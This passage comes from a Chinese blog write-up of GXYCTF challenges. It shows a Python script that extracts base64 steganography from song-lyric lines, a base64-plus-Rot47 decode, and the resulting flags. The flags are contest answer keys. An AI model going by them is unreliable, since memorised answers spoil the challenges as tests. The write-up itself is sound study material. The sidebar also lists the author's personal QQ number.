class="line">SmUgdm91ZSBtZXMgbnVpdHMsCp==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCm==</span><br><span class="line">RXQgYXV4IGJsYXNwaGVtZXMsCu==</span><br><span class="line">Sidhdm91ZSBqZSBtYXVkaXMsCm==</span><br><span class="line">VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCn==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUgKGwnYXNzYXN5bXBob25pZSksCn==</span><br><span class="line">Sidhdm91ZSBqZSBtYXVkaXMsCt==</span><br><span class="line">VG91cyBjZXV4IHF1aSBzJ2FpbWVudA==</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这题，我们 首先对它进行base64解密，得到的是莫扎特的一首音乐歌词，<br>有兴趣的朋友可以听听看！<br><img src="https://s2.ax1x.com/2019/12/22/QxMpLD.png" alt="QxMpLD.png"></p>
+</blockquote>
+<p>我从中没有得出 有用的信息，于是想到base64隐写<br><br>我们将上面base64编码的多行字符串，命名为1.txt<br><br>我们写如下代码，将其隐写的内容给输出 出来：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#codin<span class="variable">g:utf8</span></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">#http<span class="variable">s:</span>//tr0y.wang/<span class="number">2017</span>/<span class="number">06</span>/<span class="number">14</span>/Base64steg/</span><br><span class="line">with <span class="keyword">open</span>(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> <span class="keyword">f</span>:</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">line</span> in <span class="keyword">f</span>.readlines():</span><br><span class="line">        stegb64 = <span class="string">''</span>.<span class="keyword">join</span>(<span class="built_in">line</span>.<span class="keyword">split</span>())</span><br><span class="line">        rowb64 = <span class="string">''</span>.<span class="keyword">join</span>(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).<span class="keyword">split</span>())</span><br><span class="line"></span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.<span class="built_in">index</span>(stegb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[-<span class="number">1</span>]) - b64chars.<span class="built_in">index</span>(rowb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.<span class="built_in">count</span>(<span class="string">'='</span>)  # <span class="keyword">no</span> equalnum <span class="keyword">no</span> offset</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.<span class="keyword">join</span>([chr(<span class="keyword">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i in xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])  # <span class="number">8</span>位一组</span><br></pre></td></tr></table></figure>
+
+<p>直接跑出来flag了</p>
+<blockquote>
+<p>flag：GXY{fazhazhenhaoting}</p>
+</blockquote>
+<h3 id="0x07：checkin"><a href="#0x07：checkin" class="headerlink" title="0x07：checkin"></a>0x07：checkin</h3><blockquote>
+<p>签到题，我把它放到最后了， Rot47加解密，平常很少碰到，长见识了！<br><br>对它的识别，我想应该是在与  Rot47加密 通常会含有多个 ‘@’字符吧！</p>
+</blockquote>
+<p>首先，题目给了我们</p>
+<blockquote>
+<p>dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg==</p>
+</blockquote>
+<p>对其进行base64解密 得到</p>
+<blockquote>
+<p>v)<em>L</em>_F0&lt;}@H0&gt;F49023@FE0#@EN</p>
+</blockquote>
+<p>再对其进行 Rot47 解密便得到flag</p>
+<blockquote>
+<p>GXY{Y0u_kNow_much_about_Rot}</p>
+</blockquote>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf-wp/" rel="tag">#ctf_wp</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/01/2019 广外_wp0/" rel="next" title="2019 广外_wp0">
+                <i class="fa fa-chevron-left"></i> 2019 广外_wp0
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="木头">
+          <p class="site-author-name" itemprop="name">木头</p>
+          <p class="site-description motion-element" itemprop="description">做个靠谱的人！</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">51</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+		  <br>
+		  <span id="busuanzi_container_site_uv">
+			<b><span id="busuanzi_value_site_uv"></span></b><br>
+			<span class="site-state-item-name">访客</span>
+			</span>
+
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=453175619&auto=0&height=32"></iframe>
+
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=805197&auto=1&height=32"></iframe>
+    
+		<br>
+		<div align="left" font-family: "arial","microsoft yahei","黑体","宋体",sans-serif>
+		<b><h1>个人简介</h1></b>
+		<p>姓名：木头<br>
+		性别：男<br>
+		QQ：1594783824<br>
+		爱好：书,球,歌<br>
+		主要奖项： xxx</p>
+		</div>
+		<br>
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00：GXYCTF部分详细题解"><span class="nav-number">1.</span> <span class="nav-text">0x00：GXYCTF部分详细题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01：baby-sqli"><span class="nav-number">2.</span> <span class="nav-text">0x01：baby_sqli</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02：ping-ping-ping"><span class="nav-number">3.</span> <span class="nav-text">0x02：ping ping ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03：linux-常见空格绕过方法"><span class="nav-number">4.</span> <span class="nav-text">0x03：linux 常见空格绕过方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04：fantasy"><span class="nav-number">5.</span> <span class="nav-text">0x04：fantasy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路："><span class="nav-number">6.</span> <span class="nav-text">解题思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">7.</span> <span class="nav-text">exp:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05：fu"><span class="nav-number">8.</span> <span class="nav-text">0x05：fu</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06：base乱码"><span class="nav-number">9.</span> <span class="nav-text">0x06：base乱码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07：checkin"><span class="nav-number">10.</span> <span class="nav-text">0x07：checkin</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">木头</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
